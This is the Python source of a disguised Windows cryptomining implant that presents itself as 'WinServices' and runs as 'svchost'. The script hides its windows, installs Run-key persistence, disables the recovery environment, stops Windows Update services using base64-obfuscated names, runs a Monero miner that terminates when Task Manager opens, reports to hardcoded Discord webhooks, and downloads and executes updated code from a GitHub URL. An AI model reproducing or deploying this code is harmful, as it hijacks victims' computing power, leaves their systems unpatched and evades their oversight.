import os, sys, subprocess

# --- THE ABSOLUTE SHADOW (WinServices.py) ---
# This flag tells Windows: "Do NOT show a console window."
HIDE_WINDOW = 0x08000000 

# --- 0. THE VOICE FIX (BOOTSTRAP) ---
def bootstrap():
    """Ensures the engine has its voice with ZERO windows."""
    try:
        import requests, psutil
    except ImportError:
        work_dir = os.path.dirname(os.path.realpath(sys.executable))
        lib_path = os.path.join(work_dir, "Lib", "site-packages")
        if not os.path.exists(lib_path): os.makedirs(lib_path)
        
        # FIX 1: Hide the Pip Install window
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--target", lib_path], 
                              creationflags=HIDE_WINDOW)
        
        os.execv(sys.executable, [sys.executable] + sys.argv)

bootstrap()

import time, winreg, base64, argparse, platform
import requests, psutil

# --- 1. Identity & Setup ---
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="svchost")
ID = parser.parse_known_args()[0].id

WEBHOOK_SYS = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
WEBHOOK_MINE = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPyYeiAfT9nIB25FPR4kMoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"
UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"

REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
PC_NAME = platform.node()
WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
SELF_PATH = os.path.realpath(__file__)

CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",
    "NORM_PWR": "30"
}

def notify(msg, type="sys"):
    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
    full_msg = f"**[{PC_NAME} | {ID}]**: {msg}"
    try: requests.post(hook, json={"content": full_msg})
    except: pass

# --- 2. Sovereignty ---
def engage_locks():
    """Persistence and Locks with ZERO windows."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        py_path = os.path.join(WORK_DIR, "python", "pythonw.exe")
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
        winreg.CloseKey(key)
        notify("Persistence Verified.", "sys")
    except: pass
    
    try:
        # FIX 2: Hide reagentc window
        subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
        notify("Windows Recovery Environment disabled.", "sys")
    except: pass
    
    try:
        for s in SVC_LIST:
            name = base64.b64decode(s).decode()
            # FIX 3: Hide sc windows
            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=HIDE_WINDOW)
            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=HIDE_WINDOW)
        notify("Windows Updates locked.", "sys")
    except: pass

# --- 3. Auto-Updater ---
def auto_update():
    try:
        r = requests.get(UPDATE_URL)
        if r.status_code == 200:
            current_content = open(SELF_PATH, 'r').read()
            if r.text != current_content:
                with open(SELF_PATH, 'w') as f: f.write(r.text)
                notify("Shadow Sync: New version detected. Respawning...", "sys")
                os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
    except: pass

# --- 4. Throttle & Vanishing ---
def manage_power():
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    
    miner_proc = None
    for p in psutil.process_iter(['name', 'exe']):
        try:
            if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                miner_proc = p
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue

    if is_monitored:
        if miner_proc:
            try: 
                miner_proc.terminate()
                notify("Monitoring detected. Vanishing.", "sys")
            except: pass
    else:
        cpu_load = psutil.cpu_percent(interval=1)
        target_pwr = CONFIG["IDLE_PWR"] if cpu_load < 20 else CONFIG["NORM_PWR"]
        
        if not miner_proc:
            try:
                # FIX 4: Hide the Miner window FOREVER
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
                                 creationflags=HIDE_WINDOW)
                notify(f"Engine Engaged. Power: {target_pwr}%", "mine")
            except Exception as e:
                notify(f"Engine Failed: {str(e)}", "sys")

def main():
    engage_locks()
    notify("SYSTEM ONLINE", "sys")
    last_update = time.time()
    while True:
        manage_power()
        if time.time() - last_update > 43200:
            auto_update()
            last_update = time.time()
        time.sleep(10)

if __name__ == "__main__":
    main()
